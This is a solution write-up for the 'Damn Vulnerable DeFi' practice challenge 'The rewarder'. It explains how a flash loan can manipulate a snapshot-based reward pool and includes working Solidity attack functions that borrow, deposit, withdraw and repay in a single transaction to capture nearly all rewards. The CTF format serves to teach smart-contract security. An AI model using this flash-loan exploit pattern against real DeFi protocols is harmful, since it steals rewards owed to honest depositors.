## [Challenge #5 - The rewarder](https://www.damnvulnerabledefi.xyz/challenges/5.html)

There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?

## Solutions

### Self

I think I did pretty good on this one on my own. I probably got 80% of the way there, at least I had a lot of the basic concepts in the contract and JS code. I just needed to look at [cmichel.io](https://cmichel.io/damn-vulnerable-de-fi-solutions/)'s solution to tidy things up and make a couple changes. I should have commited my solution and then modified it to fit his. But I did not think about it and now it'll take too long to figure it out. Oh, well.  

### [cmichel.io](https://cmichel.io/damn-vulnerable-de-fi-solutions/)

In this challenge, there is a reward contract in addition to the flash loan contract. The reward contract pays out rewards every 5 days based on a snapshot token balance. As a general rule, if some logic relies on a single snapshot in time instead of continuous/aggregated data points, it can be manipulated by flash loans. This is also true here, we can wait until rewards are being distributed again, take a huge flash loan, and deposit all tokens from the flash loan to the reward pool. Its `deposit` function creates a new snapshot of the current token balances and immediately distributes the rewards. Due to our token balance and thus our share of the overall tokens in the reward pool being so high, the integer division results in all other accounts receiving `0` rewards.

```solidity
function attack() public {
    // take a flash loan, deposit into rewards pool
    // receive rewards, pay back flash loan

    uint256 flashLoanBalance =
        liquidityToken.balanceOf(address(flashLoanPool));
    // approve amount of flashloan for rewarderPool.deposit
    liquidityToken.approve(address(rewarderPool), flashLoanBalance);
    flashLoanPool.flashLoan(flashLoanBalance);

    // send reward tokens to attacker EOA
    require(rewardToken.balanceOf(address(this)) > 0, "reward balance was 0");
    bool success =
        rewardToken.transfer(
            msg.sender,
            rewardToken.balanceOf(address(this))
        );
    require(success, "reward transfer failed");
}

// called by IFlashLoanerPool::flashLoan
function receiveFlashLoan(uint256 amount) external {
    // deposit distributes rewards already
    rewarderPool.deposit(amount);
    rewarderPool.withdraw(amount);
    // pay back to flash loan sender
    liquidityToken.transfer(address(flashLoanPool), amount);
}
```